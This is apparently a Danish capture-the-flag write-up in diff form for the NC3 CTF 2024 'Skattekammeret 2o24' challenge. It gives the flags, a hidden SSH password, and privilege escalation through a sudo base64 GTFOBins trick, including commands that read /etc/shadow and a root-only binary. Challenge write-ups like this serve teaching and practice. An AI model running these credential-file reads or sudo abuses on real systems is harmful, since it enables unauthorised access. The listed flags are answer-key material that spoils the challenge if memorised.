@@ -1,0 +1,97 @@
+:: Skattekammeret 2o24 - robotnisse
+
+/usr/share/nginx/html/robots.txt
+
+==>
+
+# nc3{r0b0t}
+User-agent: *
+Disallow: /skjult/storenisse.html
+
+
+* WEB: /robots.txt
+
+nc3{r0b0t}
+
+
+
+
+
+:: Skattekammeret 2o24 - storenisse
+
+/skjult/storenisse.html
+
+==>
+
+<html>
+<h1>Skattekammeret2o24</h1>
+
+SHH!!!<br>
+<br>
+Hemmeligt kodeord til storenisse:<br>
+<br>
+<p style="color:white">jegkommermedfred</p>
+
+</html>
+
+==>
+
+* Brug kodeordet til at logge ind via SSH
+
+* Kun for at kunne få fat i .elf filen til PWN, og lillenisse.
+
+* PWN filen ligger som base64 i:
+
+/home/storenisse/gave.b64
+
+* Flaget er her:
+
+/home/storenisse/bmMze3JvYm90c19iYXNlNjRfMGdfcHduX2lfZW5fcGFra2V9
+
+==>
+
+nc3{robots_base64_0g_pwn_i_en_pakke}
+
+
+
+:: Skattekammeret 2o24 - lillenisse
+
+* PWN med exploit
+
+/home/lillenisse/flag.txt
+
+nc3{buff3r0verfl0w_i_2o24}
+
+
+
+:: Root
+
+GTFObins med "/usr/bin/base64" som lillenisse
+
+https://gtfobins.github.io/gtfobins/base64/
+
+LFILE=/etc/shadow
+sudo base64 "$LFILE" | base64 --decode
+
+* Det tillader LÆSNING, men ikke RCE. Derfor har flaget også et filnavn, man ikke lige gætter.
+
+* Se i "ps" at stien til port 1337 er:
+
+/root/nc3ctf24_skattekammeret2o24_root.elf
+
+* Denne kan normalt ikke læses. Men med base64 som root, kan man læse den.
+
+LFILE=/root/nc3ctf24_skattekammeret2o24_root.elf
+sudo base64 -w0 /root/nc3ctf24_skattekammeret2o24_root.elf
+
+
+* Derfra logge på via SSH som root.
+
+/root/root_flag.skattekammeret2o24.txt
+
+==>
+
+nc3{glædelig_jul_fra_dine_nissevenner_i_nc3}
+
+LFILE=/etc/shadow
+sudo base64 /etc/shadow | base64 --decode
